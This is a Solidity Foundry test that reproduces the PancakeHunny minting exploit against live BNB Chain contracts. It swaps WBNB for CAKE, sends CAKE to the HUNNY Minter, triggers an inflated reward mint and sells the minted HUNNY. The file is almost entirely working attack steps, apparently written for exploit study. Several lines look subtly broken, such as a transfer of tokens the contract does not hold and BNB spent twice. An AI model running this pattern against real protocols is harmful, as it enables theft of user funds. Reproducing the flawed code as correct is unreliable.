// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface CakeFlipVault {
    function getReward() external;
    function withdraw(
        uint256 amount
    ) external;
    function rewards(
        address
    ) external view returns (uint256);
}

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address hunnyMinter = 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300;
    CakeFlipVault cakeVault = CakeFlipVault(0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4);

    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 cake = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20 hunny = IERC20(0x565b72163f17849832A692A3c5928cc502f46D69);

    constructor() {
        wbnb.approve(address(pancakeRouter), type(uint256).max);
        hunny.approve(address(pancakeRouter), type(uint256).max);
    }

    function testExploit() public {
        wbnb.deposit{value: 5.752 ether}();
        wbnb.transfer(address(this), 5.752 ether);

        //WBNB was swapped to CAKE at PancakeSwap
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(cake);
        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0, path, address(this), 1_622_687_689);

        emit log_named_decimal_uint("Swap cake, Cake Balance", cake.balanceOf(address(this)), 18);

        //The attacker sent CAKE to our HUNNY Minter contract
        cake.transfer(hunnyMinter, 59_880_957_483_227_401_400);

        //The attacker staked on CAKE-BNB Hive in PancakeHunny
        // (prank simulated via callScript caller in playground replay)
        //HUNNY Minter was “tricked” to mint more HUNNY tokens
        cakeVault.getReward();
        hunny.transfer(address(this), hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6)));
        emit log_named_decimal_uint("Hunny Balance", hunny.balanceOf(address(this)), 18);

        //The attacker then sold the HUNNY tokens on PancakeSwap
        address[] memory path2 = new address[](2);
        path2[0] = address(hunny);
        path2[1] = address(wbnb);
        pancakeRouter.swapExactTokensForETH(hunny.balanceOf(address(this)), 0, path2, address(this), 1_622_687_089);

        emit log_named_decimal_uint("Swap WBNB, WBEB Balance", wbnb.balanceOf(address(this)), 18);
    }

    receive() external payable {}
}
